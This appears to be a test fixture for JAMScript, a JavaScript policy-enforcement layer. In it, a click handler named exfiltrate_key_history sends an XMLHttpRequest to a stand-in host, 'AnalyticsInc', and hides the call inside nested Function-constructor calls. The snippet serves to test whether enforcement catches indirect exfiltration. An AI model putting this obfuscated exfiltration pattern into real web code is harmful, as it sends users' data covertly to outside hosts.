function exfiltrate_key_history() {
  var nest = 'return Function(\'xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=nest4", true);xmlhttp.send(null);\');';
  var v3 = JAMScript.call(Function, null, [nest]);
  var v0 = JAMScript.call(v3, null, []);
  var v1 = xmlhttp = new XMLHttpRequest;
  JAMScript.call(v0, null, [v1]);
  return
}
var v2 = document.getElementById("test");
JAMScript.set(v2, "onclick", exfiltrate_key_history);

